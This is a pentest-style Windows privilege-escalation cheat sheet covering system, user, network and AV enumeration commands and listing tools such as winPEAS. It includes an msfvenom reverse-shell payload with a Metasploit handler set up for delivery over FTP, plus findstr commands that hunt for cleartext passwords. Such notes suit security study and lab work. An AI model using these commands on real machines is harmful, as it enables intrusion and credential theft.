# Windows-Privesc

# Terms:
```
IIS - Internet Information Services, is an extensible web server software created by Microsoft for use with the Windows NT family. Its supports HTTP, HTTP/2, HTTPS, FTP, FTPS, SMTP and NNTP. 

DLL - Dynamic-link library is Microsoft's implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraris containing ActiveX controls), or DRV (for legacy system drivers). The file formats for DLLs are the same as for Windows EXE files - that is, Portable Executable (PE) for 32-bit and 64-bit Windows, and New Executable (NE) for 16-bit Windows. As with EXEs, DLLs can contain coded, data and resources, in any combination.

Meterpreter - Meterpreter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
Meterpeter is deployed using in-memory DLL injection. As a result, Meterpeter resides entirely in memory and writes nothing to disk.

```
# Basic commands:
```
whoami - command to see corrent user.
---
dir - command to list all files and directories that exist.
---
sysinfo - command to see system info.
---
shell - command to get shell.
---
findstr - command to grep specific thing that you want.
---
hostname - command to get hostname.
---
wmic qfe - command to extract patching.
---
wmic logicaldisk - to get the list of drives.
---
net user - command to get the users that exist.
---
net localgroup - command to get the localgroups that exit on the system.
---
netstat - command to get the ports.
---
sc - command to use service control.
---
```
## Reverse shell using ftp
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
---
After we see that we get a shell we can go to msfconsole and write use exploite/multi/handler.
When we are in the exploit we need to set the payload with the next command ---> set payload windows/meterpeter/reverse_tcp (the payload is the same as we used earlier.
After we can write options and see that the payload is set and we can see that there is a LHOST LPORT that we need to set the same as we did in the payload.
Payload for LHOST ---> set lhost $IP
Payload for LPORT ---> set lport $port
After we've set all the things that we need we can use the command run.

Then we need to go the the ftp server and upload our file and execute it.
```
# System Enumeration
```
First lets use the command systeminfo.
---
For example we can use systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" to get specific things that we want.
---
We can see how many drives are the in the system by using the command wmic logicaldisk.
```
# User Enumeration
```
First we want to see what user we got so lets use the command ---> whoami.

To see what privileges we got we can use the command ---> whoami /priv.

To see what groups we are involved in we can use the command ---> whoami /groups.

To see what users are on the machine we can use the command ---> net user (to get information about the users that we see we can add the user name to the command).

To see what localgroup exists we can use the command ---> net localgroup (we can add administrator to the command to see what users are in the administrator group or we can add any existing group to enumerate our way to users in a specific group).

```
# Network Enumeration
```
First lets use the command ---> ipconfig to get the basic information about the network ( we can add /all to see more information).

We can look at a arp table with using the command arp -a.

We can look at the routing table with using the command ---> route print.

We can see the ports that are out there by using the command ---> netstat -ano
```
# Password Hunting in cleartext
```
We can use the command findstr /si password *.txt *.ini *.config
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *.config* 
```
#  AV and Firewall Enumeration
```
We can use the command ---> sc query windefend (to see information about windows defender).

To see all of the services that are running on the machine we can use the command ---> sc queryex type= service.

To see the firewalls that are up we can use the command ---> nets advfirewall firewall dump / netsh firewall show state / netsh firewall show config.
```
# Automated Tools
```
Executables
---
winPEAS.exe
Seatbelt.exe (need to compile)
Watson.exe (need to compile)
SharpUp.exe (need to compile)
---
PowerShell
---
Sherlock.ps1 (looks for common vulnerabilites)
PowerUp.ps1
jaws-enum.ps1
---
Other
---
windows-exploit-suggester.py (local on attack machine)
Exploit suggester (Metasploit)

```
